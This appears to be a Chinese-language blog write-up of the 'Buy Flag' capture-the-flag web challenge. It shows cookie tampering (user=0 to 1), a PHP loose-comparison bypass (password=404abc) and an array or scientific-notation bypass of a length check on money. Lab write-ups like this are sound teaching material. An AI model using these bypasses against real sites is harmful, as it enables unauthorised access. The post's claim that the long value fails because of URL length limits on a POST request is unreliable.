---
title: Buy Flag
date: 2023-10-27T13:02:11+08:00
slug: 71ccb67
tags:
  - MD5
categories:
  - CTF
---

之前还是一个新手村门口人的时候打开过，那个时候的无助真的有点好笑。

  

<!--more-->

  

# CUIT Student

一般这种什么都不外露的就先查看页面源代码，所以找到了：

```php

<!--

    ~~~post money and password~~~

if (isset($_POST['password'])) {

    $password = $_POST['password'];

    if (is_numeric($password)) {

        echo "password can't be number</br>";

    }elseif ($password == 404) {

        echo "Password Right!</br>";

    }

}

-->

```

POST传参，目前还用不到。所以我们抓包：

```http

GET /pay.php HTTP/1.1

...

Accept-Language: ja,zh-CN;q=0.9,zh;q=0.8

Cookie: user=0

Connection: close

```

有一个`cookie: user=0`，发送repeater模块，试试修改为1。得到`you are Cuiter`

  

-----

  

# psw can't be number

  

最开始没有注意到这个`is_numeric()`，自信的写404，然后得到了不能是数字的回复。

当时我满脑子？？？？？？？？？

不能是404但是又必须是404？？？？？？？

小小的脑袋塞满了大大的问号。

  

-----

  

不过因为在做这个之前做了Easy MD5，知道了PHP的神秘宇宙规则——在PHP的宇宙里，*不能是404但是又必须是404*完全可以做到。

就是那个PHP弱类型比较。

  

做一个简单的测试

```php

<?php

    $a=404;

    $b='404abc';//进行修改

    //是否相等,目标为true

    $c=var_dump($a==$b);

    //是否是数字，目标为false

    $d=var_dump(is_numeric($b));

    echo $c,$d;

?>  

```

>在 PHP 中，var_dump() 函数主要用于打印变量的相关信息，如类型、值和长度等。它并不直接用于进行布尔值判断。当 var_dump() 函数用于布尔值时，它会输出该布尔值的类型和值。

  

所以构造payload：

```http

password=404abc&money=100000000

```

  

<font color=red>注意是用post的方式传参</font>

  

-----

  

# Nember lenth is too long

  

>当使用 POST 方法向 PHP 文件传递参数时，参数的值通常需要进行 URL 编码。这是为了确保参数值中不包含特殊字符或空格等无效字符，从而避免出现错误。

当尝试将 money 参数的值设置为 100000000 时，由于该值太长，可能会导致 URL 长度超过服务器限制，从而导致请求失败。

  

`password=404abc&money[]=1`——php对字符进行判断的函数存在漏洞，数组可以很好的绕过<br>

  

不过可能是<a href=https://blog.csdn.net/cherrie007/article/details/77473817>`strcmp()`函数漏洞</a>利用

  

-----

  

另外一种是科学记数法：`money=100000000=1e9`

  

----
